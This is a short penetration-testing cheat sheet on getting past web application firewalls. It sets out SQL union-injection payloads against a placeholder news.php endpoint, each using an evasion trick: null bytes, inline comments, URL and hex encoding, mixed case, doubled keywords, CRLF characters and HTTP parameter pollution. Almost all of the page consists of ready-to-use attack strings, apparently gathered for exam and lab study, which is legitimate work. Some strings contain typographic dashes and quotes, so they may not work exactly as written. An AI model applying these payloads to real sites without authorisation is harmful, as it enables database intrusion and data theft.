# Bypassing WAF

## WAF

Some web applications have a Web Application Firewall to prevent web attacks. However, these WAFs are based on rules, access control lists, and policies. Some WAFs can be misconfigured or they may be vulnerable to some exploit. On this page, we will go over some common techniques to bypass WAFs.

### WAF SQL Union Injection Bypass Techniques

The examples below were extracted from this [s4vitar](https://s4vitar.github.io/oscp-preparacion/#) blog post.

Null Bytes:

```text
http://example.com/news.php?id=1+%00’union+select+1,2,3′–
```

SQL Queries through comments:

```text
http://example.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3–
```

URL Encoding

```text
http://example.com/news.php?id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4—
```

Encode to Hex Forbidden

```text
http://example.com/news.php?id=-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 –+-
http://example.com/news.php?id=-1%2F%2Funion%2F%2Fselect%2F**%2F1,2,3,4,5 –+-
```

Case Changing

```text
http://example.com/news.php?id=-1+UnIoN//SeLecT//1,2,3–+-
```

Replaced Keywords

```text
http://example.com/news.php?id=-1+UNunionION+SEselectLECT+1,2,3–+
```

WAF Bypassing - using characters

```text
http://example.com/news.php?id=-1+uni*on+sel*ect+1,2,3,4–+-
```

CRLF WAF Bypass Technique

```text
http://example.com/news.php?id=-1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5 —
```

HTTP Parameter Pollution \(PHP\)

```text
http://example.com/news.php?id=1;select+1&id=2,3+from+users+where+id=1–
http://example.com/news.php?id=-1/* &id= */union/* &id= */select/* &id= */1,2 —
```



